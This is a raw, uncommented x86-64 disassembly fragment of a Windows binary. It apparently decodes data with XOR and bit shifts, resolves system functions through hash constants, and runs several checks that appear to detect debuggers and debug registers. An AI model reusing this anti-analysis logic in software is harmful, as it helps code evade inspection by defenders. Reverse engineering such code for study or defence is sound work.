   14005956f:	mov    QWORD PTR [rbp+0x710],rax
   140059576:	mov    r9,rsi
   140059579:	imul   r9,r8
   14005957d:	push   0x8
   14005957f:	pop    rcx
   140059580:	sub    rcx,r8
   140059583:	dec    r8
   140059586:	mov    rax,QWORD PTR [rbp+0x7c0]
   14005958d:	lea    r11,[rax+r9*1]
   140059591:	mov    rax,r9
   140059594:	xor    edx,edx
   140059596:	push   0x14
   140059598:	pop    rdi
   140059599:	div    rdi
   14005959c:	cmp    rcx,0x8
   1400595a0:	je     0x1400595c6
   1400595a2:	cmp    r8,0x7
   1400595a6:	ja     0x140059d80
   1400595ac:	imul   rax,rax,0xffffffffffffffec
   1400595b0:	mov    al,BYTE PTR [r11+rax*1]
   1400595b4:	xor    BYTE PTR [rbp+rcx*1+0x710],al
   1400595bb:	inc    rcx
   1400595be:	inc    r11
   1400595c1:	inc    r9
   1400595c4:	jmp    0x140059591
   1400595c6:	mov    r11,QWORD PTR [rbp+0x710]
   1400595cd:	bswap  r11
   1400595d0:	and    r11,r10
   1400595d3:	inc    rsi
   1400595d6:	mov    QWORD PTR [rbp+0xfd0],rsi
   1400595dd:	mov    r9,QWORD PTR [rbp+0x1040]
   1400595e4:	mov    rax,QWORD PTR [rbp+0x1030]
   1400595eb:	mov    r8,QWORD PTR [rbp+0x1038]
   1400595f2:	mov    rdx,r9
   1400595f5:	sub    rdx,r8
   1400595f8:	sub    rdx,rax
   1400595fb:	mov    rcx,QWORD PTR [rbp+0xf90]
   140059602:	cmp    rdx,rcx
   140059605:	cmovae rdx,rcx
   140059609:	cmp    rdx,0x1
   14005960d:	adc    rdx,0x0
   140059611:	mov    r10d,ecx
   140059614:	sub    r10d,edx
   140059617:	and    r10b,0x3f
   14005961b:	cmp    rcx,rdx
   14005961e:	movzx  ecx,r10b
   140059622:	mov    r10d,0x0
   140059628:	cmovbe ecx,r10d
   14005962c:	shr    r11,cl
   14005962f:	mov    r10,QWORD PTR [rbp+0x1020]
   140059636:	mov    rsi,QWORD PTR [rbp+0x1028]
   14005963d:	mov    ecx,edx
   14005963f:	shld   rsi,r10,cl
   140059643:	shl    r10,cl
   140059646:	test   dl,0x40
   140059649:	cmovne rsi,r10
   14005964d:	mov    ecx,0x0
   140059652:	cmove  rcx,r10
   140059656:	or     rcx,r11
   140059659:	mov    QWORD PTR [rbp+0x1028],rsi
   140059660:	mov    QWORD PTR [rbp+0x1020],rcx
   140059667:	add    rax,rdx
   14005966a:	mov    QWORD PTR [rbp+0x1030],rax
   140059671:	jmp    0x140059122
   140059676:	add    rax,0xfffffffffffffff8
   14005967a:	mov    QWORD PTR [rbp+0x1030],rax
   140059681:	mov    rdx,QWORD PTR [rbp+0x1028]
   140059688:	mov    r9,rdx
   14005968b:	mov    ecx,eax
   14005968d:	shr    r9,cl
   140059690:	mov    r10,QWORD PTR [rbp+0x1020]
   140059697:	mov    rsi,r10
   14005969a:	shrd   rsi,rdx,cl
   14005969e:	push   0xffffffffffffffff
   1400596a0:	pop    rdi
   1400596a1:	mov    r11,rdi
   1400596a4:	shl    r11,cl
   1400596a7:	test   al,0x40
   1400596a9:	cmovne rsi,r9
   1400596ad:	mov    ecx,0x0
   1400596b2:	cmove  rcx,r11
   1400596b6:	cmove  r11,rdi
   1400596ba:	not    r11
   1400596bd:	not    rcx
   1400596c0:	and    rcx,r10
   1400596c3:	and    r11,rdx
   1400596c6:	test   rax,rax
   1400596c9:	cmove  r11,rax
   1400596cd:	cmove  rcx,rax
   1400596d1:	mov    QWORD PTR [rbp+0x1020],rcx
   1400596d8:	mov    QWORD PTR [rbp+0x1028],r11
   1400596df:	add    r8,0x8
   1400596e3:	mov    QWORD PTR [rbp+0x1038],r8
   1400596ea:	mov    r8,QWORD PTR [rbp+0x1118]
   1400596f1:	mov    r9,QWORD PTR [rbp+0x1120]
   1400596f8:	lea    rax,[r8+0x8]
   1400596fc:	cmp    rax,r9
   1400596ff:	jbe    0x140059708
   140059701:	xor    edx,edx
   140059703:	jmp    0x140059cd9
   140059708:	mov    rax,QWORD PTR [rbp+0x1110]
   14005970f:	cmp    rax,0x8
   140059713:	jae    0x140059c64
   140059719:	mov    rcx,QWORD PTR [rbp+0x10b0]
   140059720:	cmp    rcx,QWORD PTR [rbp+0x10b8]
   140059727:	jae    0x14005976d
   140059729:	mov    rcx,QWORD PTR [rbp+0x1068]
   140059730:	mov    rdx,QWORD PTR [rbp+0x10a8]
   140059737:	cmp    rdx,rcx
   14005973a:	jae    0x14005976d
   14005973c:	mov    rax,QWORD PTR [rbp+0x1178]
   140059743:	movzx  edi,BYTE PTR [rax+rdx*1]
   140059747:	and    edi,0x7f
   14005974a:	inc    rdx
   14005974d:	cmp    rdx,rcx
   140059750:	jae    0x140059778
   140059752:	mov    rax,QWORD PTR [rbp+0x1178]
   140059759:	movzx  eax,BYTE PTR [rax+rdx*1]
   14005975d:	test   al,al
   14005975f:	jns    0x140059775
   140059761:	shl    rdi,0x7
   140059765:	and    eax,0x7f
   140059768:	or     rdi,rax
   14005976b:	jmp    0x14005974a
   14005976d:	xor    r11d,r11d
   140059770:	jmp    0x140059be0
   140059775:	mov    rcx,rdx
   140059778:	mov    QWORD PTR [rbp+0x10a8],rcx
   14005977f:	mov    rax,rdi
   140059782:	shr    rax,0x8
   140059786:	mov    r14,rdi
   140059789:	shr    r14,0x28
   14005978d:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   140059794:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   14005979b:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   1400597a2:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   1400597a9:	mov    DWORD PTR [rbp+0xd10],eax
   1400597af:	lea    rax,[rip+0x2e8a2]        # 0x140088058
   1400597b6:	mov    QWORD PTR [rsp+0x20],rax
   1400597bb:	lea    rcx,[rbp+0xcc0]
   1400597c2:	push   0x4
   1400597c4:	pop    rdx
   1400597c5:	lea    r8,[rbp+0xd10]
   1400597cc:	mov    r9,rdx
   1400597cf:	call   0x1400638fe
   1400597d4:	mov    BYTE PTR [rbp+0xcc4],r14b
   1400597db:	mov    r15,QWORD PTR [rbp+0x1080]
   1400597e2:	cmp    QWORD PTR [rbp+0x10c8],r15
   1400597e9:	jbe    0x140059915
   1400597ef:	mov    r9,QWORD PTR [rbp+0x1088]
   1400597f6:	cmp    r9,0x4
   1400597fa:	ja     0x140059d9c
   140059800:	mov    rcx,QWORD PTR [rbp+0x1090]
   140059807:	cmp    rcx,0x5
   14005980b:	jae    0x140059dae
   140059811:	mov    r14,QWORD PTR [rbp+0x10c8]
   140059818:	cmp    r14,r15
   14005981b:	je     0x140059dbc
   140059821:	mov    r8,r14
   140059824:	mov    eax,DWORD PTR [rbp+rcx*4+0x10d8]
   14005982b:	mov    cl,BYTE PTR [rbp+0x1098]
   140059831:	rol    eax,cl
   140059833:	sub    r8,r15
   140059836:	xor    eax,DWORD PTR [rbp+r9*4+0x10d8]
   14005983e:	xor    edx,edx
   140059840:	div    r8
   140059843:	mov    r13,rdx
   140059846:	mov    rax,QWORD PTR [rbp+0x10d0]
   14005984d:	mov    QWORD PTR [rbp+0x710],rax
   140059854:	cmp    r15,0x40
   140059858:	push   0x40
   14005985a:	pop    rax
   14005985b:	cmovae r15,rax
   14005985f:	movaps XMMWORD PTR [rbp+0xd40],xmm7
   140059866:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   14005986d:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140059874:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   14005987b:	lea    rcx,[rbp+0xd10]
   140059882:	mov    rdx,r15
   140059885:	call   0x14003c0b8
   14005988a:	test   r14,r14
   14005988d:	je     0x1400598db
   14005988f:	mov    rcx,rax
   140059892:	mov    r8,rdx
   140059895:	mov    rax,rdx
   140059898:	add    rax,r13
   14005989b:	mov    r9,QWORD PTR [rbp+0x10c0]
   1400598a2:	cmp    rax,r14
   1400598a5:	jbe    0x1400598c5
   1400598a7:	xor    r10d,r10d
   1400598aa:	cmp    r8,r10
   1400598ad:	je     0x1400598db
   1400598af:	lea    rax,[r10+r13*1]
   1400598b3:	xor    edx,edx
   1400598b5:	div    r14
   1400598b8:	mov    al,BYTE PTR [r9+rdx*1]
   1400598bc:	mov    BYTE PTR [rcx+r10*1],al
   1400598c0:	inc    r10
   1400598c3:	jmp    0x1400598aa
   1400598c5:	add    r9,r13
   1400598c8:	xor    eax,eax
   1400598ca:	cmp    r8,rax
   1400598cd:	je     0x1400598db
   1400598cf:	mov    dl,BYTE PTR [r9+rax*1]
   1400598d3:	mov    BYTE PTR [rcx+rax*1],dl
   1400598d6:	inc    rax
   1400598d9:	jmp    0x1400598ca
   1400598db:	mov    rcx,QWORD PTR [rbp+0x1078]
   1400598e2:	xor    eax,eax
   1400598e4:	cmp    r15,rax
   1400598e7:	je     0x140059915
   1400598e9:	cmp    rcx,0x3f
   1400598ed:	ja     0x140059d8e
   1400598f3:	mov    edx,eax
   1400598f5:	and    edx,0x7
   1400598f8:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   1400598ff:	xor    dl,BYTE PTR [rbp+rax*1+0xd10]
   140059906:	inc    rax
   140059909:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140059910:	inc    rcx
   140059913:	jmp    0x1400598e4
   140059915:	movaps XMMWORD PTR [rbp+0x740],xmm7
   14005991c:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140059923:	movaps XMMWORD PTR [rbp+0x720],xmm7
   14005992a:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140059931:	xor    eax,eax
   140059933:	cmp    rax,0x40
   140059937:	je     0x14005994f
   140059939:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   140059940:	bswap  ecx
   140059942:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   140059949:	add    rax,0x4
   14005994d:	jmp    0x140059933
   14005994f:	movups xmm0,XMMWORD PTR [rbp+0x10d8]
   140059956:	mov    eax,DWORD PTR [rbp+0x10e8]
   14005995c:	movups XMMWORD PTR [rbp+0xd10],xmm0
   140059963:	mov    DWORD PTR [rbp+0xd20],eax
   140059969:	and    DWORD PTR [rbp+0xd24],0x0
   140059970:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   140059977:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   14005997e:	movaps xmm2,XMMWORD PTR [rbp+0x730]
   140059985:	movaps xmm3,XMMWORD PTR [rbp+0x740]
   14005998c:	lea    rax,[rbp+0xd28]
   140059993:	movups XMMWORD PTR [rax+0x30],xmm3
   140059997:	movups XMMWORD PTR [rax+0x20],xmm2
   14005999b:	movups XMMWORD PTR [rax+0x10],xmm1
   14005999f:	movups XMMWORD PTR [rax],xmm0
   1400599a2:	call   0x140064214
   1400599a7:	mov    al,BYTE PTR [rip+0x3f0e0]        # 0x140098a8d
   1400599ad:	cmp    al,0x1
   1400599af:	je     0x1400599f8
   1400599b1:	movzx  eax,al
   1400599b4:	cmp    eax,0x2
   1400599b7:	je     0x140059a9e
   1400599bd:	and    DWORD PTR [rbp+0x640],0x0
   1400599c4:	lea    rcx,[rip+0xfffffffffffa76b5]        # 0x140001080
   1400599cb:	mov    rdx,QWORD PTR [rbp+0x1150]
   1400599d2:	push   0x40
   1400599d4:	pop    r8
   1400599d6:	lea    r9,[rbp+0x640]
   1400599dd:	call   QWORD PTR [rip+0x3ae25]        # 0x140094808
   1400599e3:	test   eax,eax
   1400599e5:	sete   cl
   1400599e8:	inc    cl
   1400599ea:	mov    BYTE PTR [rip+0x3f09d],cl        # 0x140098a8d
   1400599f0:	test   eax,eax
   1400599f2:	je     0x140059a9e
   1400599f8:	mov    al,BYTE PTR [rip+0x3f1ba]        # 0x140098bb8
   1400599fe:	cmp    al,0x1
   140059a00:	je     0x140059a25
   140059a02:	movzx  eax,al
   140059a05:	test   eax,eax
   140059a07:	jne    0x140059a9e
   140059a0d:	call   0x140065d51
   140059a12:	test   rax,rax
   140059a15:	sete   cl
   140059a18:	inc    cl
   140059a1a:	mov    BYTE PTR [rip+0x3f198],cl        # 0x140098bb8
   140059a20:	test   rax,rax
   140059a23:	je     0x140059a9e
   140059a25:	call   0x140064227
   140059a2a:	mov    eax,0xc8c291de
   140059a2f:	xchg   DWORD PTR [rip+0x3f0ab],eax        # 0x140098ae0
   140059a35:	call   QWORD PTR [rip+0x3ac15]        # 0x140094650
   140059a3b:	mov    eax,eax
   140059a3d:	mov    QWORD PTR [rip+0x3e5bc],rax        # 0x140098000
   140059a44:	lea    rcx,[rbp+0xd10]
   140059a4b:	push   0xffffffffffffffff
   140059a4d:	pop    rdx
   140059a4e:	call   0x14001dfc0
   140059a53:	xor    eax,eax
   140059a55:	xchg   DWORD PTR [rip+0x3f085],eax        # 0x140098ae0
   140059a5b:	mov    BYTE PTR [rip+0x3f02c],0x0        # 0x140098a8e
   140059a62:	mov    eax,DWORD PTR [rbp+0xd10]
   140059a68:	add    DWORD PTR [rbp+0x10d8],eax
   140059a6e:	mov    eax,DWORD PTR [rbp+0xd14]
   140059a74:	add    DWORD PTR [rbp+0x10dc],eax
   140059a7a:	mov    eax,DWORD PTR [rbp+0xd18]
   140059a80:	add    DWORD PTR [rbp+0x10e0],eax
   140059a86:	mov    eax,DWORD PTR [rbp+0xd1c]
   140059a8c:	add    DWORD PTR [rbp+0x10e4],eax
   140059a92:	mov    eax,DWORD PTR [rbp+0xd20]
   140059a98:	add    DWORD PTR [rbp+0x10e8],eax
   140059a9e:	mov    BYTE PTR [rip+0x3efe7],0x0        # 0x140098a8c
   140059aa5:	movaps XMMWORD PTR [rbp+0xd30],xmm7
   140059aac:	movaps XMMWORD PTR [rbp+0xd20],xmm7
   140059ab3:	movaps XMMWORD PTR [rbp+0xd10],xmm7
   140059aba:	xor    eax,eax
   140059abc:	cmp    rax,0x14
   140059ac0:	je     0x140059ad8
   140059ac2:	mov    ecx,DWORD PTR [rbp+rax*1+0x10d8]
   140059ac9:	bswap  ecx
   140059acb:	mov    DWORD PTR [rbp+rax*1+0xd10],ecx
   140059ad2:	add    rax,0x4
   140059ad6:	jmp    0x140059abc
   140059ad8:	mov    r8,QWORD PTR [rbp+0x1070]
   140059adf:	mov    eax,edi
   140059ae1:	shr    eax,0x3
   140059ae4:	and    eax,0x1f
   140059ae7:	lea    rcx,[rax+rbp*1]
   140059aeb:	add    rcx,0xd10
   140059af2:	xor    r9d,r9d
   140059af5:	xor    edx,edx
   140059af7:	xor    eax,eax
   140059af9:	cmp    r9,0x10
   140059afd:	je     0x140059b18
   140059aff:	shld   rax,rdx,0x8
   140059b04:	mov    r10,rdx
   140059b07:	shl    r10,0x8
   140059b0b:	movzx  edx,BYTE PTR [rcx+r9*1]
   140059b10:	inc    r9
   140059b13:	or     rdx,r10
   140059b16:	jmp    0x140059af9
   140059b18:	push   0xffffffffffffffff
   140059b1a:	pop    r9
   140059b1c:	mov    r10,r9
   140059b1f:	mov    ecx,r8d
   140059b22:	shl    r10,cl
   140059b25:	cmp    r8,0x40
   140059b29:	not    r10
   140059b2c:	cmovae r10,r9
   140059b30:	and    edi,0x7
   140059b33:	lea    ecx,[r8+rdi*1]
   140059b37:	neg    cl
   140059b39:	shrd   rdx,rax,cl
   140059b3d:	shr    rax,cl
   140059b40:	test   cl,0x40
   140059b43:	cmove  rax,rdx
   140059b47:	and    rax,r10
   140059b4a:	mov    rdi,QWORD PTR [rbp+0x10b0]
   140059b51:	add    r8,0x7
   140059b55:	bswap  rax
   140059b58:	shr    r8,0x3
   140059b5c:	mov    QWORD PTR [rbp+0x710],rax
   140059b63:	mov    r9,rdi
   140059b66:	imul   r9,r8
   140059b6a:	push   0x8
   140059b6c:	pop    rcx
   140059b6d:	sub    rcx,r8
   140059b70:	dec    r8
   140059b73:	mov    rax,QWORD PTR [rbp+0x3e8]
   140059b7a:	lea    r11,[rax+r9*1]
   140059b7e:	mov    rax,r9
   140059b81:	xor    edx,edx
   140059b83:	push   0x14
   140059b85:	pop    r14
   140059b87:	div    r14
   140059b8a:	cmp    rcx,0x8
   140059b8e:	je     0x140059bb4
   140059b90:	cmp    r8,0x7
   140059b94:	ja     0x140059d80
   140059b9a:	imul   rax,rax,0xffffffffffffffec
   140059b9e:	mov    al,BYTE PTR [r11+rax*1]
   140059ba2:	xor    BYTE PTR [rbp+rcx*1+0x710],al
   140059ba9:	inc    rcx
   140059bac:	inc    r11
   140059baf:	inc    r9
   140059bb2:	jmp    0x140059b7e
   140059bb4:	mov    r11,QWORD PTR [rbp+0x710]
   140059bbb:	bswap  r11
   140059bbe:	and    r11,r10
   140059bc1:	inc    rdi
   140059bc4:	mov    QWORD PTR [rbp+0x10b0],rdi
   140059bcb:	mov    r9,QWORD PTR [rbp+0x1120]
   140059bd2:	mov    rax,QWORD PTR [rbp+0x1110]
   140059bd9:	mov    r8,QWORD PTR [rbp+0x1118]
   140059be0:	mov    rdx,r9
   140059be3:	sub    rdx,r8
   140059be6:	sub    rdx,rax
   140059be9:	mov    rcx,QWORD PTR [rbp+0x1070]
   140059bf0:	cmp    rdx,rcx
   140059bf3:	cmovae rdx,rcx
   140059bf7:	cmp    rdx,0x1
   140059bfb:	adc    rdx,0x0
   140059bff:	mov    r10d,ecx
   140059c02:	sub    r10d,edx
   140059c05:	and    r10b,0x3f
   140059c09:	cmp    rcx,rdx
   140059c0c:	movzx  ecx,r10b
   140059c10:	mov    r10d,0x0
   140059c16:	cmovbe ecx,r10d
   140059c1a:	shr    r11,cl
   140059c1d:	mov    r10,QWORD PTR [rbp+0x1100]
   140059c24:	mov    rdi,QWORD PTR [rbp+0x1108]
   140059c2b:	mov    ecx,edx
   140059c2d:	shld   rdi,r10,cl
   140059c31:	shl    r10,cl
   140059c34:	test   dl,0x40
   140059c37:	cmovne rdi,r10
   140059c3b:	mov    ecx,0x0
   140059c40:	cmove  rcx,r10
   140059c44:	or     rcx,r11
   140059c47:	mov    QWORD PTR [rbp+0x1108],rdi
   140059c4e:	mov    QWORD PTR [rbp+0x1100],rcx
   140059c55:	add    rax,rdx
   140059c58:	mov    QWORD PTR [rbp+0x1110],rax
   140059c5f:	jmp    0x14005970f
   140059c64:	add    rax,0xfffffffffffffff8
   140059c68:	mov    QWORD PTR [rbp+0x1110],rax
   140059c6f:	mov    r9,QWORD PTR [rbp+0x1108]
   140059c76:	mov    r10,r9
   140059c79:	mov    ecx,eax
   140059c7b:	shr    r10,cl
   140059c7e:	mov    r11,QWORD PTR [rbp+0x1100]
   140059c85:	mov    rdx,r11
   140059c88:	shrd   rdx,r9,cl
   140059c8c:	push   0xffffffffffffffff
   140059c8e:	pop    r14
   140059c90:	mov    rdi,r14
   140059c93:	shl    rdi,cl
   140059c96:	test   al,0x40
   140059c98:	cmovne rdx,r10
   140059c9c:	mov    ecx,0x0
   140059ca1:	cmove  rcx,rdi
   140059ca5:	cmove  rdi,r14
   140059ca9:	not    rdi
   140059cac:	not    rcx
   140059caf:	and    rcx,r11
   140059cb2:	and    rdi,r9
   140059cb5:	test   rax,rax
   140059cb8:	cmove  rdi,rax
   140059cbc:	cmove  rcx,rax
   140059cc0:	mov    QWORD PTR [rbp+0x1100],rcx
   140059cc7:	mov    QWORD PTR [rbp+0x1108],rdi
   140059cce:	add    r8,0x8
   140059cd2:	mov    QWORD PTR [rbp+0x1118],r8
   140059cd9:	xor    bl,sil
   140059cdc:	xor    bl,dl
   140059cde:	or     BYTE PTR [rbp+0xca8],bl
   140059ce4:	jmp    0x140058a14
   140059ce9:	cmp    BYTE PTR [rbp+0xca8],0x0
   140059cf0:	sete   al
   140059cf3:	mov    rcx,QWORD PTR [rbp+0x5f8]
   140059cfa:	or     cl,al
   140059cfc:	mov    QWORD PTR [rbp+0x5f8],rcx
   140059d03:	mov    rcx,QWORD PTR [rbp+0x1138]
   140059d0a:	mov    rdx,QWORD PTR [rbp+0x1148]
   140059d11:	push   0x8
   140059d13:	pop    r8
   140059d15:	push   0x10
   140059d17:	pop    r9
   140059d19:	call   0x14006f600
   140059d1e:	mov    rax,QWORD PTR [rbp+0x708]
   140059d25:	mov    QWORD PTR [rbp+0x700],rax
   140059d2c:	jmp    0x1400505c0
   140059d31:	mov    QWORD PTR [rsp+0x20],0x10
   140059d3a:	lea    rcx,[rbp+0xd10]
   140059d41:	xor    edx,edx
   140059d43:	mov    r8,QWORD PTR [rbp+0xf68]
   140059d4a:	push   0x8
   140059d4c:	pop    r9
   140059d4e:	call   0x14007e51d
   140059d53:	mov    rax,QWORD PTR [rbp+0xd18]
   140059d5a:	mov    QWORD PTR [rbp+0x1148],rax
   140059d61:	mov    rax,QWORD PTR [rbp+0xd20]
   140059d68:	jmp    0x140057c16
   140059d6d:	mov    rax,QWORD PTR [rbp+0x7a8]
   140059d74:	mov    QWORD PTR [rbp+0x7c8],rax
   140059d7b:	jmp    0x14004a833
   140059d80:	lea    r8,[rip+0x2e259]        # 0x140087fe0
   140059d87:	push   0x8
   140059d89:	jmp    0x140048134
   140059d8e:	lea    r8,[rip+0x2e33b]        # 0x1400880d0
   140059d95:	push   0x40
   140059d97:	jmp    0x140048134
   140059d9c:	lea    r8,[rip+0x2e2cd]        # 0x140088070
   140059da3:	push   0x5
   140059da5:	pop    rdx
   140059da6:	mov    rcx,r9
   140059da9:	jmp    0x14004814d
   140059dae:	lea    r8,[rip+0x2e2d3]        # 0x140088088
   140059db5:	push   0x5
   140059db7:	jmp    0x140048134
   140059dbc:	lea    rcx,[rip+0x2e2dd]        # 0x1400880a0
   140059dc3:	call   0x14007dca0
   140059dc8:	ud2
   140059dca:	mov    rax,QWORD PTR [rbp+0x6b0]
   140059dd1:	mov    cl,BYTE PTR [rax+0x2]
   140059dd4:	mov    BYTE PTR [rbp+0x1170],cl
   140059dda:	mov    eax,DWORD PTR [rax+0xbc]
   140059de0:	mov    DWORD PTR [rbp+0x1180],eax
   140059de6:	call   0x140065f29
   140059deb:	mov    esi,eax
   140059ded:	lea    rdi,[rbp+0x7d0]
   140059df4:	and    DWORD PTR [rdi],0x0
   140059df7:	mov    rcx,rdi
   140059dfa:	call   0x140066044
   140059dff:	mov    r12d,DWORD PTR [rdi]
   140059e02:	mov    ecx,0x9394fb88
   140059e07:	mov    edx,0x43b0f7b9
   140059e0c:	call   0x140064480
   140059e11:	test   rax,rax
   140059e14:	je     0x140059e55
   140059e16:	lea    rbx,[rbp+0x7d0]
   140059e1d:	and    QWORD PTR [rbx],0x0
   140059e21:	and    DWORD PTR [rbp+0xd10],0x0
   140059e28:	lea    rcx,[rbp+0xd10]
   140059e2f:	mov    QWORD PTR [rsp+0x20],rcx
   140059e34:	push   0xffffffffffffffff
   140059e36:	pop    rcx
   140059e37:	push   0x7
   140059e39:	pop    rdx
   140059e3a:	push   0x8
   140059e3c:	pop    r9
   140059e3e:	mov    r8,rbx
   140059e41:	call   rax
   140059e43:	test   eax,eax
   140059e45:	sete   al
   140059e48:	cmp    QWORD PTR [rbx],0x0
   140059e4c:	setne  r13b
   140059e50:	and    r13b,al
   140059e53:	jmp    0x140059e58
   140059e55:	xor    r13d,r13d
   140059e58:	mov    ecx,0x9394fb88
   140059e5d:	mov    edx,0x43b0f7b9
   140059e62:	call   0x140064480
   140059e67:	test   rax,rax
   140059e6a:	je     0x140059eab
   140059e6c:	lea    rbx,[rbp+0x7d0]
   140059e73:	and    QWORD PTR [rbx],0x0
   140059e77:	and    DWORD PTR [rbp+0xd10],0x0
   140059e7e:	lea    rcx,[rbp+0xd10]
   140059e85:	mov    QWORD PTR [rsp+0x20],rcx
   140059e8a:	push   0xffffffffffffffff
   140059e8c:	pop    rcx
   140059e8d:	push   0x1e
   140059e8f:	pop    rdx
   140059e90:	push   0x8
   140059e92:	pop    r9
   140059e94:	mov    r8,rbx
   140059e97:	call   rax
   140059e99:	test   eax,eax
   140059e9b:	sete   al
   140059e9e:	cmp    QWORD PTR [rbx],0x0
   140059ea2:	setne  r14b
   140059ea6:	and    r14b,al
   140059ea9:	jmp    0x140059eae
   140059eab:	xor    r14d,r14d
   140059eae:	mov    ecx,0x9394fb88
   140059eb3:	mov    edx,0x43b0f7b9
   140059eb8:	call   0x140064480
   140059ebd:	test   rax,rax
   140059ec0:	je     0x140059ef1
   140059ec2:	lea    rbx,[rbp+0xd10]
   140059ec9:	mov    DWORD PTR [rbx],0x1
   140059ecf:	and    DWORD PTR [rbp+0x7d0],0x0
   140059ed6:	mov    QWORD PTR [rsp+0x20],rdi
   140059edb:	push   0xffffffffffffffff
   140059edd:	pop    rcx
   140059ede:	push   0x1f
   140059ee0:	pop    rdx
   140059ee1:	push   0x4
   140059ee3:	pop    r9
   140059ee5:	mov    r8,rbx
   140059ee8:	call   rax
   140059eea:	or     eax,DWORD PTR [rbx]
   140059eec:	sete   bl
   140059eef:	jmp    0x140059ef3
   140059ef1:	xor    ebx,ebx
   140059ef3:	mov    ecx,0x9394fb88
   140059ef8:	mov    edx,0xf7ab60cc
   140059efd:	call   0x140064480
   140059f02:	test   rax,rax
   140059f05:	je     0x140059f45
   140059f07:	lea    rdi,[rbp+0xd10]
   140059f0e:	mov    WORD PTR [rdi],0x100
   140059f13:	lea    r9,[rbp+0x7d0]
   140059f1a:	and    DWORD PTR [r9],0x0
   140059f1e:	push   0x23
   140059f20:	pop    rcx
   140059f21:	push   0x2
   140059f23:	pop    r8
   140059f25:	mov    rdx,rdi
   140059f28:	call   rax
   140059f2a:	test   eax,eax
   140059f2c:	sete   al
   140059f2f:	cmp    BYTE PTR [rdi],0x0
   140059f32:	setne  cl
   140059f35:	cmp    BYTE PTR [rdi+0x1],0x0
   140059f39:	sete   r15b
   140059f3d:	and    r15b,al
   140059f40:	and    r15b,cl
   140059f43:	jmp    0x140059f48
   140059f45:	xor    r15d,r15d
   140059f48:	lea    rdi,[rbp+0x7d0]
   140059f4f:	mov    rcx,rdi
   140059f52:	call   0x140066080
   140059f57:	cmp    DWORD PTR [rdi],0x1
   140059f5a:	jne    0x140059f65
   140059f5c:	cmp    BYTE PTR [rbp+0x7f8],0x0
   140059f63:	jmp    0x140059f96
   140059f65:	lea    rdx,[rbp+0x7d0]
   140059f6c:	mov    ecx,0x4d0
   140059f71:	xor    eax,eax
   140059f73:	mov    rdi,rdx
   140059f76:	rep stos BYTE PTR [rdi],al
   140059f78:	mov    DWORD PTR [rdx+0x30],0x100010
   140059f7f:	mov    rcx,rdx
   140059f82:	call   0x140065e00
   140059f87:	test   eax,eax
   140059f89:	je     0x14005a16b
   140059f8f:	cmp    BYTE PTR [rbp+0x840],0x0
   140059f96:	setne  al
   140059f99:	cmp    BYTE PTR [rbp+0x1170],0x0
   140059fa0:	setne  BYTE PTR [rbp+0xd10]
   140059fa7:	test   BYTE PTR [rbp+0x1180],0x70
   140059fae:	setne  BYTE PTR [rbp+0xd11]
   140059fb5:	test   esi,esi
   140059fb7:	setne  BYTE PTR [rbp+0xd12]
   140059fbe:	test   r12d,r12d
   140059fc1:	setne  BYTE PTR [rbp+0xd13]
   140059fc8:	mov    BYTE PTR [rbp+0xd14],r13b
   140059fcf:	mov    BYTE PTR [rbp+0xd15],r14b
   140059fd6:	mov    BYTE PTR [rbp+0xd16],bl
   140059fdc:	mov    BYTE PTR [rbp+0xd17],r15b
   140059fe3:	mov    BYTE PTR [rbp+0xd18],al
   140059fe9:	lea    rcx,[rbp+0x7d0]
   140059ff0:	lea    rax,[rbp+0xd10]
   140059ff7:	mov    QWORD PTR [rcx],rax
   140059ffa:	lea    rax,[rbp+0xd19]
   14005a001:	mov    QWORD PTR [rcx+0x8],rax
   14005a005:	call   0x14003c33b
   14005a00a:	test   al,al
   14005a00c:	jne    0x14005a158
   14005a012:	lea    rax,[rbp+0x7d0]
   14005a019:	mov    rcx,QWORD PTR [rbp+0x5f8]
   14005a020:	mov    BYTE PTR [rax],cl
   14005a022:	cmp    BYTE PTR [rax],0x0
   14005a025:	je     0x14005a158
   14005a02b:	lea    rax,[rip+0x2e3b4]        # 0x1400883e6
   14005a032:	lea    rdx,[rbp+0x1060]
   14005a039:	mov    QWORD PTR [rdx],rax
   14005a03c:	push   0x15
   14005a03e:	pop    rax
   14005a03f:	mov    QWORD PTR [rdx+0x8],rax
   14005a043:	lea    rcx,[rip+0x2e3b1]        # 0x1400883fb
   14005a04a:	mov    QWORD PTR [rdx+0x10],rcx
   14005a04e:	mov    QWORD PTR [rdx+0x18],rax
   14005a052:	lea    rsi,[rbp+0xf80]
   14005a059:	mov    rcx,rsi
   14005a05c:	call   0x14005dc8a
   14005a061:	mov    rdx,QWORD PTR [rsi+0x8]
   14005a065:	mov    r8,QWORD PTR [rsi+0x10]
   14005a069:	lea    rsi,[rbp+0x500]
   14005a070:	mov    rcx,rsi
   14005a073:	call   0x14005a3e0
   14005a078:	mov    QWORD PTR [rbp+0xd10],rsi
   14005a07f:	lea    rax,[rip+0xfffffffffffe213a]        # 0x14003c1c0
   14005a086:	mov    QWORD PTR [rbp+0xd18],rax
   14005a08d:	lea    rax,[rbp+0x180]
   14005a094:	mov    QWORD PTR [rbp+0xd20],rax
   14005a09b:	lea    rax,[rip+0xc2e]        # 0x14005acd0
   14005a0a2:	mov    QWORD PTR [rbp+0xd28],rax
   14005a0a9:	lea    rax,[rip+0x31398]        # 0x14008b448
   14005a0b0:	mov    QWORD PTR [rbp+0x400],rax
   14005a0b7:	mov    QWORD PTR [rbp+0x408],0x6
   14005a0c2:	mov    eax,DWORD PTR [rip+0x3dfa8]        # 0x140098070
   14005a0c8:	test   eax,eax
   14005a0ca:	jne    0x14005a195
   14005a0d0:	lea    rcx,[rip+0x3df61]        # 0x140098038
   14005a0d7:	lea    rdx,[rip+0x2e332]        # 0x140088410
